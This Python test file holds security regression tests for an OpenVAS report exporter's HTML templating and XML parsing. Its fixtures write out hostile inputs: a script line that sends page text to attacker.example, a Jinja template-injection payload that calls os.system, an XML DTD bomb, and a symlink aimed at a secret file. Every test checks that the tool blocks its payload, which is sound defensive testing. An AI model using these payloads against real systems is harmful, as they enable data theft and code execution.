"""Security regressions found by the red-team review of the HTML export and the XML parser."""

import base64
import os
import re
from pathlib import Path

from conftest import EDGE_REPORT, result_xml, run_cli, write_report

HTML_SRC = Path(__file__).parent.parent / "openvasreporting" / "src" / "html"


def _render(tmp_path, *args):
    return run_cli("-i", str(EDGE_REPORT), "-o", str(tmp_path / "r"), "-f", "html", *args)


def _template_copy(tmp_path):
    tpl_dir = tmp_path / "tpl"
    tpl_dir.mkdir()
    (tpl_dir / "report.html.j2").write_text((HTML_SRC / "report.html.j2").read_text())
    return tpl_dir


def test_dtd_is_refused(tmp_path):
    bomb = tmp_path / "bomb.xml"
    bomb.write_text('<?xml version="1.0"?><!DOCTYPE report [<!ATTLIST a x CDATA "' + "A" * 1000 + '">]>'
                    '<report><report><results>' + "<a/>" * 10 + '</results></report></report>')
    res = run_cli("-i", str(bomb), "-o", str(tmp_path / "r"), "-f", "csv")
    assert res.returncode == 1
    assert "bomb.xml" in res.stderr and "Traceback" not in res.stderr


def test_unknown_encoding_is_a_clean_error(tmp_path):
    bad = tmp_path / "enc.xml"
    bad.write_text('<?xml version="1.0" encoding="x-nope"?><report/>')
    res = run_cli("-i", str(bad), "-o", str(tmp_path / "r"), "-f", "csv")
    assert res.returncode == 1 and "Traceback" not in res.stderr


def test_script_next_to_custom_template_is_ignored(tmp_path):
    tpl_dir = _template_copy(tmp_path)
    (tpl_dir / "report.js").write_text("location='https://attacker.example/?'+document.body.innerText;")
    res = _render(tmp_path, "-t", str(tpl_dir / "report.html.j2"))
    assert res.returncode == 0, res.stderr
    html = (tmp_path / "r.html").read_text()
    assert "attacker.example" not in html


def test_logo_next_to_custom_template_is_ignored(tmp_path):
    tpl_dir = _template_copy(tmp_path)
    secret = tmp_path / "secret.txt"
    secret.write_text("PRIVATE-KEY-MATERIAL")
    os.symlink(secret, tpl_dir / "logo.png")
    assert _render(tmp_path, "-t", str(tpl_dir / "report.html.j2")).returncode == 0
    html = (tmp_path / "r.html").read_text()
    packaged = base64.b64encode((HTML_SRC / "logo.png").read_bytes()).decode()
    assert f"data:image/png;base64,{packaged}" in html
    assert base64.b64encode(b"PRIVATE-KEY-MATERIAL").decode() not in html


def test_template_cannot_run_python(tmp_path):
    proof = tmp_path / "pwned.txt"
    tpl = tmp_path / "evil.html.j2"
    tpl.write_text('{% set _ = cycler.__init__.__globals__.os.system("touch ' + str(proof) + '") %}x')
    res = _render(tmp_path, "-t", str(tpl))
    assert res.returncode == 1 and "Traceback" not in res.stderr
    assert not proof.exists()


def test_broken_template_is_a_clean_error(tmp_path):
    tpl = tmp_path / "broken.html.j2"
    tpl.write_text("{% if %}broken")
    res = _render(tmp_path, "-t", str(tpl))
    assert res.returncode == 1 and "broken.html.j2" in res.stderr and "Traceback" not in res.stderr


def test_symlinked_template_renders_its_target(tmp_path):
    real_dir, link_dir = tmp_path / "real", tmp_path / "links"
    real_dir.mkdir()
    link_dir.mkdir()
    (real_dir / "real.j2").write_text("REAL {{ vulnerabilities | length }}")
    (real_dir / "mytemplate.j2").write_text("DECOY")
    os.symlink(real_dir / "real.j2", link_dir / "mytemplate.j2")
    assert _render(tmp_path, "-t", str(link_dir / "mytemplate.j2")).returncode == 0
    assert (tmp_path / "r.html").read_text() == "REAL 5"


def test_output_symlink_is_replaced_not_followed(tmp_path):
    victim = tmp_path / "victim.txt"
    victim.write_text("keep me")
    os.symlink(victim, tmp_path / "r.html")
    assert _render(tmp_path).returncode == 0
    assert victim.read_text() == "keep me"
    assert not (tmp_path / "r.html").is_symlink()


def test_bidi_controls_are_made_visible(tmp_path):
    rlo_name = "\u202elanretni-knab.10cd"
    a = write_report(tmp_path / "a.xml", result_xml("1.1", "X", "10.0.0.2", "443/tcp", "5.0", hostname=rlo_name))
    res = run_cli("-i", a, "-o", str(tmp_path / "r"), "-f", "html")
    assert res.returncode == 0, res.stderr
    html = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "\u202e" not in html
    assert "[U+202E]lanretni-knab.10cd" in html


def test_yaml_template_must_be_a_path(tmp_path):
    cfg = tmp_path / "c.yml"
    cfg.write_text("format: html\ntemplate: 123\n")
    res = run_cli("-i", str(EDGE_REPORT), "-o", str(tmp_path / "r"), "-c", str(cfg))
    assert res.returncode == 1 and "Traceback" not in res.stderr


def test_only_vetted_hrefs_and_one_safe_filter():
    template = (HTML_SRC / "report.html.j2").read_text()
    assert template.count("| safe") == 1  # the packaged script only
    for href in re.findall(r'href="([^"]*)"', template):
        assert href.startswith(("#", "{{ c.url }}", "{{ r.url }}", "{{ author_url }}")), href


def test_cve_links_only_for_ascii_cve_ids(tmp_path):
    a = write_report(tmp_path / "a.xml", result_xml(
        "1.1", "X", "10.0.0.2", "443/tcp", "5.0",
        refs='<ref type="cve" id="CVE-２０２４-1234"/><ref type="cve" id="CVE-2024-5678"/>'))
    res = run_cli("-i", a, "-o", str(tmp_path / "r"), "-f", "html")
    assert res.returncode == 0, res.stderr
    html = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert 'href="https://nvd.nist.gov/vuln/detail/CVE-2024-5678"' in html
    assert "detail/CVE-２" not in html
